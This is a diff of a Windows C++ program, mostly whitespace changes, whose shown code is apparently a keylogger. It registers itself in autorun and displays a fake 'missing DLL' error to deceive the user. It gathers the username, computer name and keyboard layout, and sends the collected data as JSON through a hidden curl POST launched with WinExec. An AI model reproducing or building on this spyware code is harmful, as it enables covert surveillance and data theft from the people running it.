@@ -20,7 +20,6 @@ using namespace nlohmann;
 #define KEY_MIN VK_SPACE
 #define KEY_MAX (int)'Z'
 
-#define RUS_UTF8_OFFSET 1000
 #define INFO_BUFFER_SIZE 32767
 
 #define len(obj) obj.size()
@@ -71,19 +70,19 @@ namespace win {
 	const LCID ru_lcid = MAKELCID(MAKELANGID(LANG_RUSSIAN, SUBLANG_DEFAULT), SORT_DEFAULT);
 	const LCID en_lcid = MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT), SORT_DEFAULT);
 	
-    static void auto_run();
-    static void fake_err_message();
-    static HKL get_keyboard_layout();
+	static void auto_run();
+	static void fake_err_message();
+	static HKL get_keyboard_layout();
 	static LCID get_locale();
-    static void curl_post(const json &j);
-    static std::string get_username();
-    static std::string get_compname();
+	static void curl_post(const json &j);
+	static std::string get_username();
+   	static std::string get_compname();
 }
 
 void win::auto_run() {
     char arr[MAX_PATH] = { };
 
-	::GetModuleFileNameA(NULL, arr, MAX_PATH);
+    ::GetModuleFileNameA(NULL, arr, MAX_PATH);
 
     HKEY hKey;
 
@@ -103,11 +102,11 @@ void win::auto_run() {
 void win::fake_err_message() {
     const LCID lcid = win::get_locale();
 
-	LPCSTR title = (lcid == win::ru_lcid) ? FILE_NAME_ERR_RU : FILE_NAME_ERR_EN;
-	LPCSTR message = (lcid == win::ru_lcid) ? 
+    LPCSTR title = (lcid == win::ru_lcid) ? FILE_NAME_ERR_RU : FILE_NAME_ERR_EN;
+    LPCSTR message = (lcid == win::ru_lcid) ? 
         "Запуск программы не возможен, так как на компьютере отсутствует файл DLL. Попробуйте переустановить программу"
         :
-	    "Program launch is impossible, because there is no file DLL on the computer. Try to reinstall the program";
+	"Program launch is impossible, because there is no file DLL on the computer. Try to reinstall the program";
 
     MessageBox(GetActiveWindow(), message, title, MB_ICONERROR);
 }
@@ -132,32 +131,32 @@ LCID win::get_locale() {
 
 std::string win::get_username() {
     TCHAR infobuf[INFO_BUFFER_SIZE];
-	DWORD cch = INFO_BUFFER_SIZE;
+    DWORD cch = INFO_BUFFER_SIZE;
 
-	if (GetUserName(infobuf, &cch)) {
-		return std::string(infobuf);
-	}
-	return std::string("unknown");
+    if (GetUserName(infobuf, &cch)) {
+	return std::string(infobuf);
+    }
+    return std::string("unknown");
 }
 
 std::string win::get_compname() {
     TCHAR infobuf[INFO_BUFFER_SIZE];
-	DWORD cch = INFO_BUFFER_SIZE;
+    DWORD cch = INFO_BUFFER_SIZE;
 
-	if (GetComputerName(infobuf, &cch)) {
-		return std::string(infobuf);
-	}
+    if (GetComputerName(infobuf, &cch)) {
+        return std::string(infobuf);
+    }
     return std::string("unknown");
 }
 
 void win::curl_post(const json &j) {
     std::string json_str = j.dump();
 
-	std::string s_command = "curl -X POST http://localhost:8000 --data-bin \"" + json_str + "\"";
+    std::string s_command = "curl -X POST http://localhost:8000 --data-bin \"" + json_str + "\"";
 
     LPCSTR command = s_command.c_str();
 		
-	WinExec(command, SW_HIDE);
+    WinExec(command, SW_HIDE);
 }
 
 BOOL InitInstance(HINSTANCE hInstance, int cmdShow) {
@@ -197,7 +196,7 @@ ATOM MyRegisterClass(HINSTANCE hInstance) {
 }
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
-	return DefWindowProc(hWnd, message, wParam, lParam);
+    return DefWindowProc(hWnd, message, wParam, lParam);
 }
 
 int APIENTRY wWinMain(
@@ -224,7 +223,7 @@ int APIENTRY wWinMain(
     j["\"hostname\""] = '\"' + win::get_compname() + '\"';
     j["\"username\""] = '\"' + win::get_username() + '\"';
 
-	HKL layout = win::get_keyboard_layout();
+    HKL layout = win::get_keyboard_layout();
 
     std::string old;
     
